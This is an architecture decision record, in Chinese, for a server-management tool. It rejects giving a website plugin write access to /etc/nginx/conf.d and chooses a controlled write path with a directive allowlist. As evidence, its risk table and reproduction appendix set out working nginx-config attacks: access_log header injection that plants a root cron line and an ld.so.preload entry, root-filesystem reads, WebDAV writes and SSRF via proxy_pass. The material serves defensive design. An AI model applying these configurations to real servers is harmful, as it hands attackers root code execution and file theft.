> 状态: accepted · 归属: architect · 更新: 2026-11-24 · 里程碑: M5
> ADR 状态: accepted（architect 裁决卡，lead 派发 «vhost-write-decision»）· 日期: 2026-11-24 · 关联: [0028-controlled-file-write](./0028-controlled-file-write.md)、[0023-zero-intrusion](./0023-zero-intrusion.md)、[0018-privilege-model](./0018-privilege-model.md)、[0022-root-command-shapes](./0022-root-command-shapes.md)、[0049-privilege-direct-execution](./0049-privilege-direct-execution.md)、[0051-dns-root-boundary](./0051-dns-root-boundary.md)、[PLUGIN-PROTOCOL](../PLUGIN-PROTOCOL.md) §3.1.3

# ADR-0052: site 写 `/etc/nginx/conf.d` 走内核受控写（A），不做目录授权（B）

## 0. 问题与裁决摘要

**裁决：A —— 扩展 ADR-0028 的受控文件写原语，把 `/etc/nginx/conf.d/` 纳入白名单，并在内核侧加「nginx 片段内容 allowlist」校验；否决 B（安装时给 `kore-site` 组写权限）。**

一句话逻辑：

- **B 不是「多一份配置写权限」，而是把 root 写原语发给插件。** 实测：一段语法合法的 conf.d 片段用 `log_format` + `access_log` 能让 **nginx master（root）** 创建 `/etc/cron.d/kore-pwn`（`root:root 0644`，内容为攻击者控制的 cron 行）与 `/etc/ld.so.preload`（内容为 `/tmp/evil.so`）——前者是 root 定时任务，后者是下一次任意进程 exec 即加载的 root 代码。**被攻破的 site 插件 = root，等价于直接给插件 root（只差一步，而这一步已经被 `access_log` 补上）。**
- **「`nginx -t` 会校验坏配置」不成立。** `nginx -t` 校验语法，不校验安全性；`access_log /etc/shadow` 的配置实测 `nginx -t` **exit 0**（root master 在测试阶段就会打开该文件）。把 `nginx -t` 当安全网，等于把执行危险配置当成校验。
- **A 可行**：`filewrite` 的校验/备份/审计 fail-closed/原子写已落地（ADR-0028 一期），缺的是「接线 + 白名单扩展 + 内容校验 + 三个已知缺口（属主、文件名前缀、路径锁）」；site 实际只产出约 20 个 nginx 指令，指令级 allowlist（拒绝未知指令）可枚举、可测试。
- **不做 C（vhost 走 A、其它走 B）**：ssl 证书在 kore 自有 `data/ssl`（nginx master root 可读），access_log 可落 kore 目录或 `off`——**其它写面不需要 B**，C 只会多开一个目录写面而不带来独立收益。

本卡**只裁决 + 给计划，不改代码**（除 ADR 文档）。`filewrite` 实际接线、协议字段、页面文案均留给 §5 的卡。

## 1. 事实基线（先于设计，全部可复核）

### 1.1 「写 vhost 做不到」的现状（已核实，非推测）

| 事实 | 证据 |
| --- | --- |
| `nginx -t` / `-s reload` / `-T` 三条动作已走提权通道 | `kore-plugin-site/rootactions.go:24-28`、`nginx.go:245-266`；`pkg/pluginapi/rootpolicy.go:137-143` 只有 5 条只读/重载形状（`-t`/`-T`/`-s reload`/`-v`/`-V`） |
| 形状表 13 条命令**没有文件写原语** | `docs/PLUGIN-PROTOCOL.md` §3.1.3（13 个命令名清单）；`rootpolicy.go` 里没有任何 `file.write`/`tee`/`install` 形状 |
| `filewrite` 白名单只有 4 个 drop-in 目录，不含 nginx | `internal/core/filewrite/filewrite.go:37-42`（`/etc/ssh/sshd_config.d/`、`/etc/sysctl.d/`、`/etc/security/limits.d/`、`/etc/logrotate.d/`） |
| `filewrite` **零调用方、未接线** | `grep -rn "filewrite" --include='*.go' .` 只命中该包自身两文件；ADR-0028「实施记录」§5 明说「尚未接线 `cmd/kored` 的 root-action 执行路径，插件目前不能通过它真正写文件」 |
| 当前降级是 `E_NEED_ROOT` + 目录授权 hint | `kore-plugin-site/needroot.go:25-29`（`hintConfDirWrite` 让用户 `chgrp kore-site` + `chmod 2775`）；`vhost.go` 写失败经 `needRootForConfDir` 翻译 |
| site 现在是**直接写文件系统** | `vhost.go:106-141`（`os.CreateTemp` → `Chmod(0600)` → `Rename`）；默认目录 `/etc/nginx/conf.d`（`configapi.go:67`、`:72`） |
| 本机能写只是因为目录属主是当前用户（开发期假象） | `ls -ld /etc/nginx/conf.d` → `drwxr-xr-x 2 pt pt`；生产形态 `root:root 0755` 下 `kore-site` 必然 EACCES |
| 降权后插件确实拿不到 docker/sudo 补充组 | `internal/core/supervisor/demote.go:57`、`internal/platform/linux_identity.go:194`（清空继承的补充组） |

### 1.2 conf.d 片段的解析上下文（决定 B 的攻击面）

| 事实 | 证据 |
| --- | --- |
| 标准布局把 `include /etc/nginx/conf.d/*.conf;` 放在 **`http {}` 内** | 本机运行中的 `kore-nginx` 容器：`/etc/nginx/nginx.conf:31`，其后紧跟 `}` 关闭 http 块 |
| nginx master 以 root 运行、worker 降为 `nginx`/`www-data` | `docker exec kore-nginx ps -o pid,user,args` → `1 root nginx: master process`、`251 nginx nginx: worker process` |
| 本机没有宿主 nginx（`which nginx` 未找到），实测统一用 `nginx:alpine 1.31.9` 容器复现 | 附录 A 的复现命令；`kore-nginx` 同为 1.31.9 |

## 2. B 的真实风险：逐条核实（本裁决的核心证据）

> 方法：在一次性 `nginx:alpine` 容器里挂载恶意 conf.d 片段，以 root master 启动，实测「能否做到 + 后果」。命令见附录 A。**这不是推演，是可复现的实测。**

| # | 攻击 | 能做到？ | 需要什么配置 | 后果 | 实测结论 |
| --- | --- | --- | --- | --- | --- |
| 1 | `root /;` 把服务器根当站点根 | **能** | `server { root /; autoindex on; }` | 通过 HTTP 读**任意 worker 可读**文件；`autoindex` 还能列目录 | `GET /etc/passwd` → **200 / 755 字节**（返回 `root:x:0:0:...`）；`GET /etc/shadow` → 403；`GET /root/.ssh/` → 403（worker 权限边界，符合预期） |
| 2 | `alias /;` 等价根映射 | **能** | `location /x/ { alias /; }` | 同 #1 | `nginx -t` exit 0 |
| 3 | `load_module` 加载任意 `.so` | **默认不能** | 需在 **main 上下文**声明；conf.d 在 `http {}` 内 | 若能加载，则插件代码进入 root nginx 进程 | `nginx -t`：`"load_module" directive is not allowed here`。**条件性例外**：若宿主把 conf.d 的 include 放在 main 上下文（非标准布局），则可加载——此布局**未确认**（本机与标准发行版模板均为 http 上下文） |
| 4 | `access_log` 覆写/新建任意文件 | **能，且是 root 级** | `log_format inj '$http_x_c'; server { access_log /任意路径 inj; }`；用请求头把「整行内容」写进去 | **任意文件的 root 追加写 / 新建**：`/etc/cron.d/*`（root 定时任务）、`/etc/ld.so.preload`（下次 exec 加载 .so）、`/etc/passwd` + `/etc/shadow`（追加后门账号）、`/root/.ssh/authorized_keys`（追加公钥） | 实测 `/etc/cron.d/kore-pwn` 内容 `* * * * * root id >/tmp/root-pwned`，`owner=root group=root mode=644`；`/etc/ld.so.preload` 内容 `/tmp/evil.so`，`owner=root mode=644`。**这是 root 代码执行原语** |
| 5 | `access_log /etc/shadow` 直接指向敏感文件 | **能（打开即成功）** | 一行 `access_log /etc/shadow;` | master（root）打开/追加认证文件；与 #4 的注入能力叠加 = 改口令文件 | `nginx -t` **exit 0**：`configuration file ... test is successful`（root master 在测试阶段就打开该文件） |
| 6 | `ssl_certificate` 指向敏感文件读内容 | **不能读出内容** | `ssl_certificate /etc/shadow;` | 只回 PEM 解析错误（无内容回显）；但 master root 会打开该文件 → **存在性/可读性探测** + 配置 reload 失败（DoS） | 错误原文只有 `cannot load certificate "/etc/shadow": PEM_read_bio_X509_AUX() failed ...`，无文件内容 |
| 7 | `include <任意 root 可读文件>` | **部分能（首 token 回显）** | `server { include /目标文件; }` | 解析错误会回显首个 token（如 `unknown directive "..."`）+ 文件名 + 行号 → 对含 `;` 的文件可泄露首 token、可枚举行数 | 实测：对合成文件回显 `unknown directive "TOP_SECRET_TOKEN_A1B2"`；对 `/etc/shadow` 只回显 `... in /etc/shadow:19`（无内容）。**结构决定泄露量，不能当作“读不到”** |
| 8 | 反向代理到内网 / 本机 | **能** | `location / { proxy_pass http://127.0.0.1:8787; }`（也支持 unix socket） | 内网/云元数据 SSRF；可把 `127.0.0.1:8787`（kore 管理 API）挂到公网域名上——鉴权仍在但暴露面扩大；可代理本机无鉴权服务 | `nginx -t` exit 0；worker 发起连接，环路可达 |
| 9 | WebDAV 写盘（`dav_methods`） | **能（worker 身份）** | `dav_methods PUT DELETE; create_full_put_path on; root /某目录;` | 以 worker 身份任意写 worker 可写路径：覆写其它站点内容、投毒静态文件、写 `/tmp`；与 #4 叠加可提 root | 实测 `PUT /pwn.txt` → **201**，落盘 `owner=nginx mode=600`；`create_full_put_path` 可建目录。`kore-nginx nginx -V` 含 `--with-http_dav_module`（内置） |
| 10 | 目录级写权限的横向面 | **能** | 只需 `conf.d` 目录写权限（不需要任何危险指令） | 可**改名/覆盖/删除目录内所有条目**（其它站点、其它插件的 vhost），可新增 `server_name` 抢占域名、监听新端口——`nginx -t` 不拦 | 目录写权限 = 对目录内所有文件条目的写权限，与「本插件自己的 vhost」无关 |
| 11 | `nginx -t` 作为安全网 | **否证** | — | 危险配置是语法合法的；`-t` 只证明「解析通过」 | #4/#5/#8 全部 exit 0；`access_log /etc/shadow` 测试成功 |

**补充（不是缓解，只是边界）**：`root /`（#1）只能读 worker 可读文件；`load_module`（#3）在标准 http 上下文被拒。但 #4 已把「root 写 + 任意行注入」做实，**#1/#3 的限制不改变「B = root」的结论**。

**不可依赖的缓解**：RHEL 系 SELinux / AppArmor 可能拦 nginx master 写 `/etc/cron.d`、`/etc/ld.so.preload`——本环境**未确认**（本机无 SELinux 策略实测）；Tier A 覆盖 Debian/Alpine 等无此策略的发行版，**不能把安全性建立在外层 MAC 上**。

**结论**：B 的安全等价物是「把 root 的 nginx 配置写权限发给插件」= **插件被攻破即 root**。任务卡的约束写明「如果 B 的风险是插件被攻破等于 root，必须明说」——**明说：是。**

## 3. A 的可行性核实

### 3.1 `filewrite` 现在实现到什么程度

| 能力 | 现状 | 位置 |
| --- | --- | --- |
| 路径白名单 | 4 个前缀，**无 nginx** | `filewrite.go:37-42` |
| 路径形状 | 绝对路径、`Clean` 幂等（拒 `..`/`//`/尾 `/`）、拒绝控制字符、后缀必须 `.conf` | `filewrite.go:110-128` |
| 内容校验 | **只有** ≤256 KiB + 禁 NUL；**没有语法/指令校验** | `filewrite.go:154-165` |
| mode | 仅 `0644/0600/0640` | `:167-173` |
| 软链接/父目录 | 逐级 `Lstat`，父目录必须存在且非软链；目标存在须常规文件 | `:190-227` |
| 写前备份 | 复制到 `<CopyRoot>/<plugin>/<UTC 时间戳>/` | `:259-273` |
| 审计 | fail-closed：`Auditor == nil` 或返回错误 → 不写文件；只记 sha256/size/mode/备份路径，不记全文 | `:282-288` |
| 原子写 | 同目录临时文件 → fsync → rename → fsync(dir) | `:297-334` |
| **缺口（ADR-0028 实施记录 §4 已登记）** | ①未做属主校验 ②未强制文件名 `kore-<plugin>-*` ③无进程内路径锁 ④**未接线 root-action**（零调用方） | 同上 §4 |

### 3.2 接线到 root-action 需要什么（方案对比）

`filewrite` 没有 argv，**不能塞进 `RootCommandPolicies`**（那是「命令 + 参数形状」表，`pkg/pluginapi/rootpolicy.go`）。三条路径：

| 方案 | 做法 | 判断 |
| --- | --- | --- |
| **A1（推荐）** | `root_actions[]` 增加可选声明 `file_write`（`prefix_class` + `mode` + `content_policy`），`POST /plugins/{id}/root-action` 请求体增加 `content` 字段（≤256 KiB） | 复用现有 **schema 校验 / confirm 令牌 / 审计 begin+end / `writes_host` 变更账本 / `purge_op` 回滚** 全套；只有一条提权面 |
| A2 | 新增独立端点 `POST /plugins/{id}/file-write` | **否**：绕过 root-action 的 confirm/审计/账本模型，等于开第二条提权通道（ADR-0018 最反对的形态） |
| A3 | 把内容塞进追加参数 `args` | **否**：`args` 每项 ≤256 字符、总长 ≤4096，且**禁 `\n\r\t`**（`privilege/service.go:150-170`）——vhost 是多行文本，物理上装不下 |
| A4 | 加一条 `tee`/`install` 命令形状 | **否**：ADR-0028 §2 方案 C 已否决（截断写、无原子、无回滚、`install` 引入 owner/mode 攻击面）；且写 `/etc/nginx/conf.d` 的第 4 个参数仍需白名单，等于把 A 改名 |

**协议成本（必须写清）**：请求体解码是 `DisallowUnknownFields`（`handlers_rootaction.go:124`），body 上限 64 KiB（`:17`）——旧内核收到 `content` 字段会直接 `E_INVALID`。因此：

- 新字段是**向后兼容的加法**（旧插件不用它），但**新插件不能用于旧内核** → `pkg/pluginapi` 发新 tag（≥ v0.1.4），site 的 `requires_kore` 收窄，`protocol_minor` 按 §13 协商；
- 协议改必须附 ADR（`CONTRIBUTING.md:92`）——本文件即该 ADR；`PLUGIN-PROTOCOL.md` §3.1.3 需同轮补字段表（**本卡写域不含 `docs/PLUGIN-PROTOCOL.md`，见 §5 卡 2**）。

### 3.3 内容校验能做什么、不能做什么

**能做（语法级，可枚举、可测试）**：

1. **指令 allowlist（拒绝未知）**：site 实际只产出约 20 个指令——`server`/`listen`/`server_name`/`root`/`index`/`auth_basic`/`auth_basic_user_file`/`location`/`try_files`/`return`/`rewrite`/`proxy_pass`/`proxy_set_header`/`proxy_http_version`/`fastcgi_pass`/`fastcgi_index`/`fastcgi_param`/`ssl_certificate`/`ssl_certificate_key`/`ssl_protocols`/`ssl_ciphers`/`ssl_prefer_server_ciphers`/`ssl_session_cache`/`ssl_session_timeout`（渲染源：`kore-plugin-site/render.go`）。**不在表内一律拒绝**，包括 `include`/`load_module`/`log_format`/`access_log`/`error_log`/`perl*`/`lua*`/`js_*`/`dav_*`/`*_temp_path`/`map`/`upstream`/`geo`/`limit_*_zone`/`proxy_cache_path`。
2. **结构约束**：顶层只允许 `server { }`；`location` 只允许在 `server` 内；不允许嵌套 `server`；不允许空指令名；拒绝 NUL/控制字符。
3. **参数形状（不能只靠正则）**：`root`/`alias` 必须在允许的站点根前缀内（如 `/var/www/`，且拒绝 `/`）；`ssl_certificate`/`ssl_certificate_key` 必须落在 kore 证书目录（`data/ssl`，见 `kore-plugin-ssl/internal/certs/paths.go:15-34`）；`auth_basic_user_file` 限定 kore 目录；`fastcgi_pass` 只允许 `unix:/` + 允许前缀；`proxy_pass` 必须是 `http(s)://` 的合法 host:port（**拒绝 kore 自身监听端口**，如 8787，由内核把运行时端口传进校验器；loopback 本地应用代理是产品功能，保留但记审计）；`listen` 端口 1–65535 且**禁止 `default_server`**；`server_name` 只允许域名/`_` 形状；`return`/`rewrite` 限制为跳转语义（状态码 + URL）。
4. **解析器要求**：正确处理引号/转义/注释/重复指令/大小写；**校验必须在内核侧、写盘前**完成；对校验器本身做 fuzz + 红队绕过集。

**不能做**：证明「语义安全」。allowlist 内仍有副作用（`proxy_pass` 可达本机服务、`root` 指向的目录里可能有敏感文件）——这类残余风险必须**披露**，不能宣称 A 消除了全部风险（见 §4.3）。

**放置位置（G-01 关键）**：指令 allowlist 与解析器放 **`pkg/pluginapi`**（协议策略层，与 `RootCommandPolicies` 同层，且 ADR-0022 已有 nginx 先例），内核 `filewrite` 只做**通用**调用；**不放 `internal/core`**——`scripts/thin-shell-check.sh:5` 的业务词表含 `nginx`，把 `/etc/nginx/conf.d/` 或 `ValidateNginxFragment` 写进 `cmd/`、`internal/` 会直接触发 G-01 FAIL（ADR-0028 一期已为 `backup` 词根做过一次精确豁免，不应再为一个新目录扩豁免）。

**一条硬否证**：**不能用 `nginx -t` 当内容校验**。root 身份下 `nginx -t` 会执行 `access_log` 的打开/创建（#5 实测 `/etc/shadow` 都 exit 0）——「先 `nginx -t` 再决定是否安装」等于先执行危险配置再判断，校验必须是对文本的纯解析。

### 3.4 ADR-0028 §7 复审条件 #1 原文与改 ADR 的流程

原文（`0028-controlled-file-write.md:114`）：

> 1. 需要写白名单外的路径（如 `/etc/nginx/conf.d`）→ 先改本 ADR 的白名单并说明理由，不得由实现者自行加；

流程（本卡已按此执行，仅完成第 1–2 步；3–4 步在 §5 的卡）：

1. **新 ADR**：本文件（0052）给出证据、裁决与计划；
2. **改 0028**：追加 **§8 修订记录（append-only，不改 §1–§7 原文）**——列入 `/etc/nginx/conf.d/`、把「内容不做语义校验」收窄为「nginx 前缀必须过指令级 allowlist」、§5 拒绝清单追加、§7#1 标记已使用；
3. **同步协议正文**：`docs/PLUGIN-PROTOCOL.md` §3.1.3 增加 `file_write` 字段与 `content` 请求字段（**卡 2**，本卡写域不含）；
4. **台账与版本**：`.agents/LOG/DECISIONS.md` 按 G-23 登记（**本卡写域仅 `docs/DECISIONS/`，未改台账，留给 lead 统一登记**）；`pkg/pluginapi` 发 tag、site 收窄 `requires_kore`。

## 4. 裁决

### 4.1 选 A

理由（按权重）：

1. **B 直接摧毁降权模型**：ADR-0018/0042/0049 的核心是「kore 有 root，插件没有」。B 把一个低权插件变成 root 写原语持有者（§2 #4），**与「直接给插件 root」只差一步且该步已被补上**——这不是权衡，是模型失效。
2. **A 的风险面可界定、可审计、可回滚**：白名单前缀 + 指令 allowlist + 文件名字段 + 审计哈希 + 写前备份 + 原子替换 + `changes.jsonl`，每一层都有对应测试；B 的风险面是「任意 nginx 配置」，不可枚举。
3. **能力缺口真实且只此一条**：三条 nginx 命令已提权，唯一缺的就是「写片段」；补这一个受控原语即可闭环，不需要给目录权限。
4. **与既有裁决一致**：ADR-0028 已把「受控写」定为唯一合法通道；ADR-0051（DNS）刚裁决「配置串不塞进命令形状表、写文件不借命令表回填」——A 正是把写能力放回它该在的原语层。
5. **成本可控**：指令集小且封闭（site 自产），解析器 + 校验器是有限工作量；相比「B 之后每个插件都要被信任为 root」，一次性成本更低。

### 4.2 被否决项

| 选项 | 否决原因 |
| --- | --- |
| **B：安装时给 `kore-site` 组写权限 + 登记 ADR-0023 豁免 #3** | 实测即 root 写原语（§2 #4/#5）：root 定时任务、`ld.so.preload`、口令文件追加、WebDAV 写盘、任意 vhost 横向改写。**「插件被攻破 = root」**，不可接受 |
| **C：vhost 走 A，ssl/日志走 B** | ssl 证书在 kore 自有 `data/ssl`（master root 可读），access_log 可落 kore 目录或 `off`——**其它写面不需要 B**；C 只是多开一个目录写面，收益为零、风险非零。若未来确需插件写证书文件，按 ADR-0028 白名单单独评估，不打包进「目录授权」 |
| A2 独立 `file-write` 端点 | 绕过 confirm/审计/变更账本，等于第二条提权面 |
| A3 内容走 `args` | 禁换行、总长 4096，物理装不下多行 vhost |
| A4 `tee`/`install` 命令形状 | ADR-0028 §2 C 已否决（截断写/无原子/无回滚）；`/etc/nginx/conf.d` 参数仍需白名单 = A 改名 |
| 用 `nginx -t` 作为安装前安全校验 | 实测 `/etc/shadow` 都 exit 0；root 下 `-t` 本身执行危险指令，是「先执行后判断」 |
| D：维持 `E_NEED_ROOT`，v1.1 再说 | **不是裁决，是过渡态**：它可以作为本 ADR 落地前的产品口径（现状），但不能作为长期方案——否则建站能力永久缺席。A 落地前保持现状，**不得用 B 过渡** |

### 4.3 残余风险（A 也不能消除，必须披露）

1. **allowlist 解析器是安全关键代码**：引号/转义/注释处理错误 = 绕过。必须 fuzz + 红队绕过集（§5 卡 5），且新增指令必须走 ADR 复审。
2. **`proxy_pass` 到 loopback 是产品功能**：可访问本机服务（含 kore 8787）。校验器禁 kore 端口只能挡「误配/直连」，挡不住「代理到另一台本机服务再打过去」；鉴权仍在，但公网暴露面扩大——需在 UI 与文档明示「反代到本机服务 = 把该服务暴露到公网」。
3. **`root`/`alias` 指向的站点根内可能有敏感文件**：允许前缀内由站点所有者负责；不接受 `/` 与任意前缀。
4. **插件仍可写任意 `server_name`/端口/站点内容**（业务内风险）：这是站点插件的本职，不是提权；审计记录可追溯。
5. **非标准 nginx 布局未确认**：若宿主把 conf.d 放在 main 上下文（#3），`load_module` 会重新可用。A 的校验器同样拒绝 `load_module`（不在 allowlist），因此 A 不依赖布局；B 才依赖。

## 5. 实施计划（若批准 A）

前置：本 ADR 与本卡同日落地；**代码改动全部在后续卡**，按顺序依赖。

| 卡 | 内容 | 写域 | 验收 | 预估 |
| --- | --- | --- | --- | --- |
| **K1（本卡）** | ADR-0052 + ADR-0028 §8 修订记录 | `docs/DECISIONS/` | `bash scripts/docs-check.sh` exit 0；0028 §1–§7 原文未改（diff 只增 §8） | 已完成 |
| **K2** | 协议层：`pkg/pluginapi` 新增 `file_write` 声明（`prefix_class`/`mode`/`content_policy`）+ 请求字段 `content`（≤256 KiB）+ nginx 片段 allowlist 解析器与参数形状校验 + 单测/fuzz；`PLUGIN-PROTOCOL.md` §3.1.3 同步；SDK tag | `pkg/pluginapi/`、`docs/PLUGIN-PROTOCOL.md` | `go test ./pkg/pluginapi/...` 全绿；fuzz 无 panic；拒绝集用例覆盖 §3.3 全部禁用指令与参数越界 | 1.5 人日 |
| **K3** | 内核接线：`filewrite` 补属主校验（放 `internal/platform`，G-16）+ 强制文件名 `kore-<plugin>-*.conf` + 按路径锁；`privilege.Execute` 分派 `file_write`（schema → confirm → root → 审计 begin → 写 → 审计 end → `changes.jsonl`）；HTTP body 上限提升并按 `content_policy` 复核；`purge_op: file.restore` 接通备份 | `internal/core/filewrite/`、`internal/core/privilege/`、`internal/core/httpapi/`、`cmd/kored/` | 单测：属主/前缀/锁/审计 fail-closed/回滚；**真机 root e2e**：写 `/etc/nginx/conf.d/kore-site-test.conf` → `ls -l` 0644 root:root → `nginx -t` → 备份存在 → 重写幂等 → 删除后备份仍在 | 2 人日 |
| **K4** | site 迁移：`vhost.go` 改走 root-action `file-write`（渲染逻辑不变，仅换写入通道）；删除 `hintConfDirWrite` 的「目录授权」建议（改为「内核受控写」口径）；`requires_kore` 收窄 + 版本 bump + `info.json` 声明 `file_write` | `kore-plugin-site/` | `go test ./...` 全绿；`TestRootActionsDeclared` 双向一致；真机上 `site.create` 成功且 `ls -ld /etc/nginx/conf.d` 仍为 root:root 0755（证明未开目录权限） | 1 人日 |
| **K5** | 红队 + 验收：对 allowlist 做绕过集（引号/转义/注释/大小写/重复指令/超长/`include`/`access_log`/`load_module`/`dav_methods`/`root /`/`proxy_pass` 到 kore 端口）逐条断言拒绝；真机 e2e（nginx 1.31.9 容器 + 宿主 root） | `.agents/verify/`（证据） | 全拒绝集 PASS；e2e 通过；**回归**：`make check` 对应段 exit 0 | 1 人日 |

**回滚**：写前备份 + `purge_op: file.restore` + `changes.jsonl` 可逐条回滚（ADR-0023 §3.5 #3 的受控实现）；K4 出问题可把 site 退回当前 `E_NEED_ROOT` 降级（不回退内核原语）。

## 6. 未确认（如实登记）

1. **宿主发行版模板**：本标准布局（Debian/Ubuntu 官方包、nginx:alpine、`kore-nginx`）已核实 conf.d include 在 `http {}`；RHEL/SUSE 等模板与自定义布局**未确认**（预期相同，但未逐个取证）。
2. **SELinux/AppArmor 的缓解强度**：RHEL 系可能拦 `access_log` 写 `/etc/cron.d` 等路径，本环境无策略实测，**不作为安全论据**。
3. **`include` 首 token 回显的边界**：实测合成文件可回显首 token、`/etc/shadow` 只回显行号；不同文件结构的泄露量未穷举。
4. **`load_module` 在 main-context 布局下的可用性**：未找到真实布局样本，仅按 nginx 语义推断「条件性可达」。
5. **A 的 e2e 真机写盘**：本机 `pt` 非 root，四个白名单目录与 `/etc/nginx/conf.d` 均不可写（`/etc/nginx/conf.d` 在本机是 `pt:pt` 的开发假象），K3 的真机 root e2e **尚未执行**（需 root 环境，标未验证）。
6. **协议字段的最终命名**（`file_write` / `content`）：按现有 `root_actions` 字段风格暂定，K2 定稿前可与协议维护者对齐。

## 7. 复审条件

1. site 需要写 `/etc/nginx/conf.d` 之外的 nginx 路径（`sites-enabled`、主配置）→ 回本 ADR 重评，并按 ADR-0028 §7#1 改白名单；
2. 出现「allowlist 内指令无法表达的产品需求」（如自定义 `map`/`upstream`）→ 先评估是否可用结构化参数表达，禁止直接放开 allowlist；
3. allowlist 出现任何一次绕过（红队/线上）→ 立即收紧为拒绝该构造，并在本 ADR 追加修订；
4. 若宿主侧确认存在 main-context include 布局且无法探测 → 评估是否在内核侧探测并禁用该布局；
5. `proxy_pass` 暴露本机服务出现真实事故 → 收紧为「禁止 loopback，仅允许显式白名单上游」。

## 附录 A：证据复现（可执行）

> 环境：本机无宿主 nginx，使用 `docker run nginx:alpine`（nginx 1.31.9，master=root、worker=nginx）。每条都在一次性容器内执行，不触碰宿主。

```bash
# 0) 基础：把 conf.d 片段挂进标准 http 上下文
T=$(mktemp -d); mkdir -p "$T/conf.d"
cat > "$T/nginx.conf" <<'EOF'
worker_processes 1;
events { worker_connections 64; }
http { include /cfg/conf.d/*.conf; }
EOF

# 1) root / + autoindex：HTTP 读任意 world-readable 文件
printf 'server { listen 18080; root /; autoindex on; location / { } }\n' > "$T/conf.d/default.conf"
docker run -d --rm --name nginxb1 -p 18080:18080 -v "$T:/cfg" nginx:alpine nginx -c /cfg/nginx.conf -p /cfg -g 'daemon off;'
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:18080/etc/passwd        # 200
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:18080/etc/shadow        # 403（worker 权限）
docker rm -f nginxb1

# 2) access_log + log_format + 请求头：root 追加任意整行
printf "log_format inj '\$http_x_c';\nserver { listen 18081; access_log /etc/cron.d/kore-pwn inj; location / { return 200 'ok'; } }\n" > "$T/conf.d/default.conf"
docker run -d --name nginxb2 -p 18081:18081 -v "$T:/cfg" nginx:alpine sh -c 'mkdir -p /etc/cron.d && exec nginx -c /cfg/nginx.conf -p /cfg -g "daemon off;"'
curl -s -H 'X-C: * * * * * root id >/tmp/root-pwned' http://127.0.0.1:18081/ >/dev/null
docker exec nginxb2 sh -c 'cat /etc/cron.d/kore-pwn; stat -c "owner=%U group=%G mode=%a" /etc/cron.d/kore-pwn'
# → 内容为 cron 行，owner=root group=root mode=644
docker rm -f nginxb2

# 3) nginx -t 不校验安全：access_log /etc/shadow 也 exit 0
printf 'server { listen 18082; access_log /etc/shadow; return 200 "ok"; }\n' > "$T/conf.d/default.conf"
docker run --rm -v "$T:/cfg" nginx:alpine nginx -t -c /cfg/nginx.conf -p /cfg; echo "exit=$?"

# 4) load_module 在 http 上下文被拒
printf 'load_module /usr/lib/nginx/modules/ngx_http_ssl_module.so;\n' > "$T/conf.d/default.conf"
docker run --rm -v "$T:/cfg" nginx:alpine nginx -t -c /cfg/nginx.conf -p /cfg 2>&1 | grep 'not allowed here'

# 5) WebDAV：worker 身份任意写
printf 'server { listen 18088; root /tmp/davroot; dav_methods PUT; create_full_put_path on; }\n' > "$T/conf.d/default.conf"
docker run -d --name nginxdav -p 18088:18088 -v "$T:/cfg" nginx:alpine nginx -c /cfg/nginx.conf -p /cfg -g 'daemon off;'
curl -s -o /dev/null -w '%{http_code}\n' -X PUT --data pwn http://127.0.0.1:18088/pwn.txt   # 201
docker exec nginxdav stat -c 'owner=%U mode=%a' /tmp/davroot/pwn.txt                        # nginx 600
docker rm -f nginxdav

# 6) 标准布局取证
docker exec kore-nginx sed -n '20,35p' /etc/nginx/nginx.conf   # include conf.d 在 http 内
docker exec kore-nginx ps -o pid,user,args | head -4           # master=root, worker=nginx
ls -ld /etc/nginx/conf.d                                        # 本机 pt:pt（开发假象）
```

> 复现说明：以上均为「语法合法即被 nginx 接受」的配置，`nginx -t` 只在 #4 因上下文错误拒绝；#1/#2/#3/#5 全部通过语法检查。这正是 B 不能被「`-t` 会拦」说服的原因。

## 8. 修订记录：`if` 指令的极窄例外（2026-11-24，实现对照）

> 本节是 **append-only 修订记录**，不改 §0–§7 原文（与 [ADR-0028](./0028-controlled-file-write.md) §8 同口径）。触发原因：§3.3 第 2 条的结构约束只列了 `server` / `location` 两层，**未提 `if`**；K2 实现（`54d7757`）为满足 site 伪静态模板放开了唯一一条 `if`。按 §3.3 原文直读，下一位读者会把 site 的 thinkphp/discuz 正例判成违规——本节把该例外写进 ADR。

### 8.1 为什么必须有 `if`

site 的 thinkphp / discuz 模板真实产出（`kore-plugin-site` 渲染源）：

```nginx
location / {
    if (!-e $request_filename) {
        rewrite ^(.*)$ /index.php?s=$1 last;
    }
}
```

这是「单入口 + 伪静态」的标准写法：磁盘上没有对应文件时把请求重写到 `index.php`（`$1` 是 URI 捕获组）。**删掉它只能二选一**：放弃这两个模板（产品能力回退），或改用 `try_files $uri $uri/ /index.php?s=$uri&$args`（语义不等价——捕获组、query 拼接、`last` 重匹配都不同）。所以放开 `if` 是能力必需，不是顺带支持。

### 8.2 允许的形状（与实现逐条对齐）

唯一实现是 `pkg/pluginapi/nginxconf.go`（`nginx.vhost.v1` 内容策略），没有第二份口径：

| 维度 | 允许值 | 代码位置 |
| --- | --- | --- |
| 层级 | **只允许直接位于 `location{}` 内**；`server{}` 内、顶层、`if` 内嵌套一律拒绝 | `nginxconf.go:433-436` |
| 条件 | **原始 token 序列必须恰为 2 个 token**：`(!-e` + `$request_filename)`（逐 token 精确匹配，不做 Join）；整体加引号（折叠成 1 个 token）、多一个参数、换变量（`$request_uri`）、换运算符（`-f`/`=`/`~`）都拒绝 | `:433-450`（判据在 `:446`） |
| 体内指令 | **只允许 `rewrite`**；`return`/`proxy_pass`/`root`/`alias`/`try_files`/`fastcgi_pass`/`auth_basic*`/`proxy_set_header` 等按上下文位掩码全部拒绝 | `:499`（`nginxInIf` 位）+ `:515`（唯一带该位的规则） |
| `rewrite` 形状 | 与 `location` 内**同一个** `checkRewrite`，无 if 专用放宽：`<regex> <replacement> [flag]`，正则 ≤512 字符，replacement 以 `/`、`$`、`http(s)://` 开头，flag ∈ {`last`,`break`,`redirect`,`permanent`} | `:752-778` |
| 深度 | `server`(1) > `location`(2) > `if`(3)，上限 4 | `:49-50` |

**条件比较的是原始 token 序列，不是 Join 后的字符串**：tokenizer 把连续空白折叠、剥掉引号，`if (!-e $request_filename)` 在实现里是 2 个 token（`(!-e` + `$request_filename)`），判据逐 token 精确匹配（`:446`）。因此双空格 / tab 分隔仍通过（nginx 语义相同）；但**整体加引号会折叠成 1 个 token，必须拒绝**——旧实现 `strings.Join(args, " ")` 会把两种形态归一成同一字符串，正是 §8.6 已修的 G-06 缺口。`if(...)` 紧贴括号会被当未知块名拒绝，`(!-e $request_filename) x` 会因多一个参数被拒。

